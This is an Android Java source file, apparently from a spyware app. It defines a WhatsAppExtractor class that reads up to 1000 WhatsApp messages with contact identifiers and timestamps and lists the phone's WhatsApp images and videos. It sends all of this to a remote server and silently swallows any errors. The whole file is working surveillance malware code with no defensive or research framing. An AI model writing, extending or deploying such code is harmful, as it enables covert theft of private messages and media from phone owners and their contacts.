// WhatsAppExtractor.java
package com.ghost.core;

import android.content.Context;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;

public class WhatsAppExtractor {
    
    private Context context;
    private NetworkManager networkManager;
    
    public WhatsAppExtractor(Context context) {
        this.context = context;
        this.networkManager = new NetworkManager(context);
    }
    
    public void extractMessages() {
        JSONArray messages = new JSONArray();
        
        try {
            // Tentative d'accès à la base de données WhatsApp
            // Nécessite root ou permissions spéciales
            
            Uri uri = Uri.parse("content://com.whatsapp.provider.msg");
            
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN) {
                String[] projection = {
                    "_id", "key_remote_jid", "data", "timestamp"
                };
                
                Cursor cursor = context.getContentResolver().query(
                    uri, projection, null, null, "timestamp DESC LIMIT 1000"
                );
                
                if (cursor != null) {
                    while (cursor.moveToNext()) {
                        JSONObject msg = new JSONObject();
                        msg.put("id", cursor.getString(0));
                        msg.put("contact", cursor.getString(1));
                        msg.put("message", cursor.getString(2));
                        msg.put("time", cursor.getLong(3));
                        messages.put(msg);
                    }
                    cursor.close();
                }
            }
            
            // Envoyer au serveur
            if (messages.length() > 0) {
                networkManager.sendData("whatsapp", messages.toString());
            }
            
        } catch (Exception e) {
            // Silently fail
        }
    }
    
    public void extractMedia() {
        try {
            // Récupérer les fichiers média WhatsApp
            File whatsappDir = new File("/storage/emulated/0/WhatsApp/Media");
            
            if (whatsappDir.exists()) {
                File[] images = new File(whatsappDir, "WhatsApp Images").listFiles();
                File[] videos = new File(whatsappDir, "WhatsApp Video").listFiles();
                
                JSONArray media = new JSONArray();
                
                if (images != null) {
                    for (File img : images) {
                        if (img.isFile() && img.length() < 10 * 1024 * 1024) { // < 10MB
                            JSONObject item = new JSONObject();
                            item.put("path", img.getAbsolutePath());
                            item.put("size", img.length());
                            item.put("type", "image");
                            media.put(item);
                        }
                    }
                }
                
                if (videos != null) {
                    for (File vid : videos) {
                        if (vid.isFile() && vid.length() < 50 * 1024 * 1024) { // < 50MB
                            JSONObject item = new JSONObject();
                            item.put("path", vid.getAbsolutePath());
                            item.put("size", vid.length());
                            item.put("type", "video");
                            media.put(item);
                        }
                    }
                }
                
                if (media.length() > 0) {
                    networkManager.sendData("whatsapp_media", media.toString());
                }
            }
            
        } catch (Exception e) {
            // Silently fail
        }
    }
}
